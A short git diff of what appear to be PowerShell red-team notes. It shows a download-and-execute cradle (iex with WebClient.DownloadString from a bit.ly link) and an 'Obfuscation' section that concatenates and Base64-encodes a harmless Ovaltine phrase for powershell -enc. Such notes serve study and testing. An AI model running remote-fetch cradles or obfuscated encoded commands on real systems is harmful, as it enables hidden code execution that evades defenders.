@@ -102,13 +102,14 @@ iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
 
 ### 1.3.2 Obfuscation
 
+# You may need to covert all quotes to straight quotes below
 iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’”
 
 #region
-    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(@"
-    iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’”
-    "@
-    ))
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(@"
+iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’”
+"@
+))
 #endregion
 
 powershell -enc aQBlAHgAIAAdIBkgQgBlACAAcwB1AHIAZQAgAHQAbwAgAGQAcgBpAG4AawAgAHkAbwB1AHIAIABPAHYAYQBsAHQAaQBuAGUAIQAZIB0g
